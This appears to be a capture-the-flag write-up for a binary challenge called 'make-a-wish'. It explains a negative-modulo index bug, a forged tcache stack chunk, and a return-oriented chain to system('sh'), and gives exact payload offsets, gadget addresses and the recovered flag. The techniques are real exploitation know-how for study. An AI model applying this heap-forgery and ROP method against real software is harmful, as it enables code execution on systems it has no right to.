# make-a-wish analysis notes

## Inputs

- Official archive SHA-256: `af1ba822245a37c6492248a8392fdb3f74f23827d8c17e34671b62fb18d68cd6`
- `chal` SHA-256: `5f509bcc657e13347a69c8bb0291ba500c48f24adcdfd598b9a6d0bf3a407bbe`
- Remote endpoint: the `main` TCP endpoint in `../instance.json`
- Tools: Python 3.12.10, file 5.45, GNU Binutils 2.42, local glibc 2.39

## Binary observations

- ELF x86-64, dynamically linked, not stripped.
- No PIE (`ET_EXEC`), NX enabled, no stack canary, Partial RELRO.
- The ELF advertises IBT and SHSTK properties, but the verified remote exploit accepts the return-oriented chain.
- `main` stores five wish pointers at `rbp-0x60` through `rbp-0x40`, the second-name pointer at `rbp-0x70`, the 30-byte name buffer at `rbp-0x30`, and the saved return address at `rbp+0x8`.

## Root cause and primitive

Both `create` and `delete` compute a signed `number % 5` and use it without rejecting negative results. Consequently, `wishes[-2]` aliases the second-name pointer at `rbp-0x70`.

The initial 30-byte name is arranged as follows:

| Name offset | Value after `split` | Purpose |
|---:|---|---|
| `0x00` | `0` | fake `prev_size` |
| `0x08` | `0xa1` | fake `size` for `malloc(0x90)` |
| `0x0f` | separator changed from space to NUL | completes the size word |
| `0x10` | second name / fake user pointer | aligned address `rbp-0x20` |

`delete(-2)` therefore calls `free(rbp-0x20)`, placing the forged `0xa0` stack chunk in tcache. `create(0)` immediately receives `rbp-0x20` from `malloc(0x90)`, and its `fgets(..., 0x90, stdin)` overwrites the saved return address at payload offset `0x28`.

## ROP layout

| Payload offset | Value | Effect |
|---:|---:|---|
| `0x18` | `0x402013` | valid empty `first_name` for the final `printf` |
| `0x20` | `0` | saved `rbp` |
| `0x28` | `0x4012e2` | hidden `pop rdi; pop rbp; ret` gadget |
| `0x30` | `0x402011` | `"sh\0"` substring in `"Wish\0"` |
| `0x38` | `0` | dummy `rbp` |
| `0x40` | `0x401130` | `system@plt` |
| `0x48` | `0x4011e0` | `exit@plt` |

The hidden gadget begins inside the immediate bytes of `mov eax, 0x5fc3c031` in `sub_401296`.

## Verification evidence

- `analysis/probe.py` returned exit code 0 and printed `LOCAL_CODE_EXECUTION_OK` under WSL/glibc 2.39.
- `solve.py` returned exit code 0 against the configured remote endpoint and emitted exactly `K17{my_f4v0ur1t3_fl4v0ur_15_k1w1_p1n34ppl3_btw}` with no trailing newline.

